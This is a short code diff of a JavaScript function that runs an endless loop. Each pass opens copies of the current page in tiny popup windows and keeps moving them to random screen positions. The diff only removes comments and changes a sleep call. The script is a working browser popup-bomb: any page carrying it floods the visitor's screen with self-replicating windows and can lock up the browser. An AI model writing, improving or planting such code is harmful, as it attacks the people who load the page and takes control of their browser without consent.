@@ -3,7 +3,6 @@ function sleep(ms) {
 }
 
 function moveWindows() {
-  // Create two windows
   while (true) {
     let newWindow = window.open(location.href, "_blank", "width=0,height=0");
 
@@ -13,13 +12,10 @@ function moveWindows() {
       clearInterval(interval);
     }
 
-    // Set the initial positions and velocities of the windows
     let windowX = Math.random() * window.screen.availWidth;
     let windowY = Math.random() * window.screen.availHeight;
 
-    // Move the windows diagonally and make them bounce off the edges
     const frame = function () {
-      // Move window 1
       windowX = Math.random() * window.screen.availWidth;
       windowY = Math.random() * window.screen.availHeight;
       newWindow.moveTo(windowX, windowY);
@@ -27,7 +23,7 @@ function moveWindows() {
       requestAnimationFrame(frame);
     };
     frame();
-    // sleep(10);
+    sleep(100);
   }
 }
 
